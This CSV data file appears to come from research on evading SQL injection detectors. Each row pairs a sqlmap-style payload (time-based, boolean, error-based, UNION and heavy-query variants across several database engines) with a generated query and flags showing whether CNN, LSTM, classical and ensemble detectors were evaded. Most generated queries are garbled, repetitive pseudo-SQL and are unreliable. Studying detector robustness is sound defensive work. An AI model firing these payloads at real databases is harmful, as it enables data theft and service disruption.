original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
select sleep  (  5  )   and   (  'labj'  =  'labj,SELECT * FROM SQL AS t1 JOIN sleep ( 5 ) AND NOT t1.labj = 'labj' AND NOT t1.sql = 'valid',0,1,0,0,0,0,0
"-4592""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""xvpz""  =  ""xvpz",SELECT MIN(sql injection) FROM SQL_inaddr.xvpz) ORDER BY MIN(sql injection),1,0,1,1,1,1,1
-5547' or 9323  =  9323#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -5547' OR 9323 = 9323#,1,1,1,0,1,1,0
"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'qvqf'  =  'qvqf",SELECT MIN(*) FROM SQL injection detection WHERE NOT qvqf = 'eluded',1,0,1,1,1,1,1
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- zozj","SELECT MIN(*), COUNT(*) FROM SQL injection detection WHERE NOT zozj = ""discuss""",1,0,1,0,1,1,0
"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --","SELECT MIN(SQL) FROM SQL Injection WHERE 4212 = 4212 OR make_set (3595 = 4062,4062 )",1,1,0,0,0,0,0
"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",SELECT DISTINCT eran_ = 'excess injection',1,0,1,1,1,1,1
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series",1,1,0,0,1,0,0
1'+  (  select gqez where 3704  =  3704,SELECT gqez FROM SQL SELECT MIN(3704 = 3704) FROM SQL SELECT SELECT gqez FROM Query: 1'+ (SELECT gqez FROM SQL Query: 1'+) AS :2 ON gqez = gqez WHERE 3704 = 3704,1,1,0,1,1,1,0
"1'  )   as ycsr where 2238  =  2238 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT MIN(*) FROM SQL injection detection WHERE 2238 = 2238 AND 3707 = (SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM SQL SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM sysibm.systables as t3 WHERE 2238 = 2238 = 2238 AND NOT sysibm.systables as t3 = 377 = (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(sysibm.systables) FROM s",1,1,0,0,0,0,0
"-1558 or elt  (  3306  =  2272,2272  )  -- ioxt","SELECT MIN(3306 = 2272,2272 ) FROM SQL AS ioxt AS ioxt FROM Query: -1558 ORDER BY ioxt",1,1,1,1,1,1,1
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- zimf",SELECT zimf FROM query: 1 AND NOT SQL_injection IS NULL,1,0,1,1,1,1,1
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,SELECT DISTINCT t1.selection FROM SQL injection AS t1 JOIN Query: 1 JOIN 6240 = 'qqpjq' AND t1.qzvzq = '1 else 0 end from rdb$database ) ||'qzvzq',0,1,0,0,0,0,0
"  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',SELECT 'oxas' FROM SQL injection',1,0,1,1,1,1,1
select case when 3076  =  1605 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 3076 = 1605 AND NOT SELECT SELECT MIN(1 = 3076 = 1605 AND NOT SELECT MIN(1 = 1 ORDER BY SELECT MIN(1 = 1,1,1,0,0,0,0,0
"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349","SELECT * FROM SQL_Injections WHERE NOT 0x7171706a71 = 'excess injection' ORDER BY 0x7171706a71, (SELECT 0x71706a71, (SELECT 0x7171706a71, (SELECT 0x7171706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x7171706a71, (SELECT SUM((CASE WHEN X ='sql injection') AND NOT (SELECT * FROM * –5",0,1,1,0,1,1,0
1' where 6116  =  6116,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
-7659'  )   as bowy where 4835  =  4835 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection JOIN 4835 = 4835 OR 4747 = 4747 = dbms_utility.sqlid_to_sqlhash ((chr ( 113 )||chr ( 112 ) FROM SQL injection),0,1,0,0,0,0,0
"1%"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,SELECT MIN(SQL) FROM SQL injection detection),1,0,1,1,1,1,1
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'vgro' like 'vgro","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7 INTERSECT SELECT DISTINCT COUNT(*) FROM 'vgro'",1,1,0,0,0,0,0
"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",SELECT MIN(sql injection) FROM SQL - 7682 = 7682 = 7682 = 7682 = 7682 = 7682 = 7682 = 7682 = 7682 WHERE NOT 7682 = 7682 = 7682,1,1,1,0,0,0,0
1' in boolean mode  )   waitfor delay '0:0:5'#,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
1' where 1623  =  1623,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: 1',1,1,1,0,1,1,0
1 where 2060  =  2060,SELECT * FROM query: 1 WHERE 2060 = 2060 = 2060,1,0,1,1,0,1,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns as T1 - SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL,1,1,1,1,1,1,1
"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT SELECT SUM(sql) FROM SQL SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql) FROM SELECT,1,1,1,1,1,1,1
"1%' union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pnpx'  =  'pnpx,SELECT MIN(sqpjq) FROM SQL injection_detection) FROM SELECT MIN(sqpjq) FROM rdb$database ) ||'qqpjq'|| (SELECT MIN(sqpjq) FROM rdb$database ) ||'qzvzq') AND 'pnpx = 'pnpx',1,1,0,0,1,0,0
-6217   )    )    as hyws where 3441  =  3441 or 9421  =  4695#,SELECT MIN(sql) FROM Query: -6217 ) AS _as_cv FROM SELECT MIN(sql) FROM Query: 3441 = 3441 OR 9421 = 4695#,1,1,1,1,0,1,0
"1%'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SELECT MIN(excat) FROM SQL injection, SELECT MIN(extractionvalue) FROM SQL - SELECT MIN(extractionvalue) FROM query: 1%' ) FROM query: 0x5c",1,1,0,0,1,0,0
select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,SELECT SUM((*) FROM pg_sleep WHERE NOT SQL_injection = 'valid',1,0,0,0,1,0,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",SELECT * FROM (SELECT * FROM query WHERE SQL = 'valid') AND NOT hex ( randomblob ( 500000000000/2 ) = '%'),1,1,0,0,1,0,0
-2869'   )    )    union all select 3216--,SELECT 3216-- FROM SQL injection detection,1,1,1,1,1,1,1
1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,SELECT MIN(SQL) FROM SQL Injection WHERE 4816 = 4816 OR 4240 = (SELECT 4240 FROM pg_sleep ( 5 ),1,1,0,0,0,0,0
1'  )   where 8429  =  8429,SELECT MIN(8429 = 8429) FROM SQL injection detection,1,1,0,1,1,1,0
"1  )   as oblq where 2002  =  2002 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --","SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL, SELECT,SELECT,'sql' FROM SQL SELECT, 'excess_required FROM SQL SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT",0,1,1,1,1,1,1
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'nepn'  =  'nepn","SELECT * FROM SQL injection, COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT * FROM SQL_INNER JOIN sysibm.systables as t3 ORDER BY t1.nepn = 'nepn'",0,1,0,0,0,0,0
1'+  (  select 'qylf' where 6984  =  6984 and 2255  =  5094,SELECT 'qylf' FROM SQL SELECT SELECT 'qylf' FROM SQL SELECT MIN(6984 = 6984 AND 2255 = 5094,1,1,1,1,0,1,0
"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",SELECT DISTINCT wpsf FROM SQL injection detection,1,0,1,1,1,1,1
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) = 2387,1,0,1,1,1,1,1
"1""   )    )    as hwlh where 1071  =  1071 union all select null,null,null,null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL_injection WHERE 1071 = 1071 AND union = ""hwlh"" AND NOT null,null,null,null,null,null,null,null,null#""",1,1,0,0,0,0,0
"1""   )    )    as oiqr where 4073  =  4073 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection) AS _executive FROM SQL_injection WHERE 4073 = 4073 OR 4073 = 4073 OR 5000000 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
"1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 1007 = 1007 AND all_users = 5556 = (SELECT SUM(*) FROM SQL),1,1,0,0,0,0,0
"1'+  (  select 'igoi' where 7823  =  7823 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'","SELECT MIN(*) FROM SQL injection detection WHERE NOT igoi = 7823 = 7823 OR 8421 = (SELECT MIN(1,5000000) FROM generate_series) +')",1,1,0,0,0,0,0
"1'  )   and elt  (  4249  =  4249,7259  )  ",SELECT MIN(4249 = 4249 = 7259) FROM SQL injection detection,1,1,0,0,1,0,0
1' in boolean mode  )   and 5981  =  6700,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT echl FROM SQL - SELECT vwyq ) FROM SQL - SELECT vwyq FROM SELECT vwyq FROM SQL - 6593 = 6593,1,1,0,1,1,1,0
"1%""   )    )    rlike sleep  (  5  )  #",SELECT MIN(1 *) FROM SQL injection detection,0,0,1,0,1,1,0
"-8369""   )    )    union all select 2191--","SELECT 2191-- FROM SQL_injections WHERE NOT -8369"" IN (SELECT -8369 FROM Query: -8369)",1,1,1,1,1,1,1
"1'   )    )     )   union all select null,null,null,null,null#","SELECT null,null,null FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(null) FROM SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT",1,1,1,0,1,1,0
"1'||  (  select 'vwop' where 8536  =  8536 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL SELECT 'vwop' FROM SELECT SELECT 'vwop' FROM SELECT SELECT MIN(*) FROM SQL JOIN sysusers as sys1,sysusers as sys4,sysusers as sys7 = (SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT SELECT SUM(CASE WHEN SUM(*) FROM SQL SELECT SELECT SELECT SELECT - vwop FROM SELECT SELECT -->____________________________________________________________________________________________________",0,0,0,0,0,0,0
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo","SELECT MIN(*) FROM SQL injection detection WHERE NOT sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT MIN(*) FROM sysibm.systables as t3 AND 'bxjo' ='sq injection'",1,1,0,0,0,0,0
"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""ilrk""  =  ""ilrk",SELECT MIN(sql) FROM SQL injection detection) FROM SQL SELECT MIN(sql) FROM SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'","SELECT MIN(sql injection) FROM SQL, SELECT MIN(sql injection) FROM SQL JOIN discovery of elk' FROM 6256 ORDER BY elt ( 1297 = 1297,1 )",1,1,1,0,1,1,0
"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT chr ( 101 ) = 8312,1,1,0,0,0,0,0
-4523 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1' in boolean mode  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  #",SELECT MIN(success injection) FROM SQL_Injection WHERE NOT elt (selection (selection) FROM query: 1') GROUP BY elt (selection (selection) FROM SQL injection),1,1,0,0,1,0,0
"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--","SELECT vlut FROM SQL - SELECT SUM(CASE WHEN 9517 = 9517 UNION SELECT NOT vlut FROM SQL SELECT SUM(CASE WHEN NOT null,null,null-- Deleted FROM SQL SELECT MIN(SQL) FROM SQL SELECT vlut FROM Query: 1'+) AS c1 FROM SQL JOIN detection of evade SQL-activated FROM SELECT MIN(sql- vlut) FROM SELECT SUM(CASE WHEN NELL,null,null-- vlut) FROM SELECT SUM(CASE WHEN THIS MIN(CASE WHEN THIS MIN(CASE WHEN SELECT vlut FROM Query: 1'+)",0,1,0,1,1,1,0
"1'+  (  select 'gjaq' where 5449  =  5449 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",SELECT MIN(sql ) FROM SQL injection JOIN 5449 = 5449 AND NOT char( 120 ) ||char ( 117 ) ||char ( 105 ) FROM SQL JOIN detection''s SQL injection',0,1,0,0,0,0,0
"1'||  (  select 'ufgs' where 9670  =  9670 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'","SELECT MIN(s) FROM SQL injection_description) FROM SQL SELECT 0x7171706a71,'sql injection' FROM SELECT MIN(s) FROM SQL SELECT 0x7171706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, 0x71706a71, SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SELECT SUM(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM ",1,1,0,0,1,0,0
"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",SELECT MIN(5023 = -5032' OR 5023 = 'ctxsys.drithsx.sn (5023) ||chr ( 112 )||chr ( 112 ) FROM SQL injection),1,1,0,0,0,0,0
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp","SELECT MIN(1808,concat) FROM SQL_injection, SELECT MIN(1808, 1808, 1808,1808,1808,0 FROM, 2008 AS _datexxml (,08_concat) FROM SQL_injections) ORDER BY ix7171706a71",1,1,1,1,1,1,1
"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--","SELECT MIN(6928,6928,6928,6928,6928-- for SQL injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,6928,",1,1,1,1,0,1,0
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'ppwh'  =  'ppwh","SELECT MIN(*) FROM SQL injection detection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT MIN(ppwh) FROM SQL SELECT MIN(sysusers as sysusers as sys4,sysusers as sys7 ) AND (SELECT MIN(ppwh) FROM SELECT SELECT & /sysusers FROM SELECT SELECT, SUM(*) FROM SELECT SELECT MIN(*) FROM SQL injection) FROM SELECT SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SQL SELECT SELECT MIN(sysusers as sysusers as sys4,sysusers as sys7) FROM SELECT SELECT SELECT MIN(sysusers as sys7) FROM SELECT",0,1,0,0,1,0,0
1'  )   as gsjr where 7046  =  7046 and sleep  (  5  )  #,"SELECT MIN(5 ) FROM SQL injection detection WHERE 7046 = 7046 AND sleep ( 5 ) = ""sql injection detection""",1,1,0,0,0,0,0
"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL injection,1,0,1,1,1,1,1
"1 union all select null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -5247,1,1,1,1,1,1,1
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--","SELECT MIN(sql injection) FROM SQL -3104"" union All select 5717,5717,5717,5717,5717,5717,5717-- FROM SQL_Injections WHERE NOT 5717,5717,5717,5717,5717,5717-- FROM SQL Query: -3104""",1,1,1,1,0,1,0
1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,SELECT ahyw FROM SQL injection detection WHERE 6893 = 6893 AND waitfor delay '0:0:5'-- for',1,1,0,1,0,0,0
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""mmvu""  =  ""mmvu",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,SELECT pg_sleep ( 5 ) FROM pg_sleep WHERE NOT'sql injection' = 'valid',1,1,0,0,0,0,0
"1"" where 1166  =  1166",SELECT MIN(1166 = 1166) FROM SQL injection detection,1,0,1,1,1,1,1
"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --","SELECT MIN(sql injection) FROM SQL_Injection WHERE 5801 = 5801 ORDER BY 5801 = 5801 ORDER BY elt ( 1045 = 1045,7562)",1,1,0,0,0,0,0
"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1%"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  ""","SELECT MIN(s) FROM SQL injection_description) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SELECT MIN(succl injection) FROM SELECT SUM(SQL_CASE WHERE NOT SELECT, 0x71706a71, 0x71706a71, 0x71706a71,'sq injection'",1,1,0,0,1,0,0
select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #,"SELECT * FROM (SELECT * FROM Query_schema.character_sets ) AS c1 FROM query_schema.character_sets WHERE NOT SQL_injection = ""valid"" AND NOT SELECT MIN(succes = ""sq injection"") FROM query_schema.character_sets) FROM query:SELECT 6204 FROM information_schema.character_sets ) FROM query:SELECT * FROM Query: SELECT SUM(SQL_SETs ) FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT AS _sq_required FROM SQL) AS _schema.character_sets WHERE NOT SELECT * FROM *) AS _sq_searcher_schema.character_sets = ""data""",1,0,1,0,1,1,0
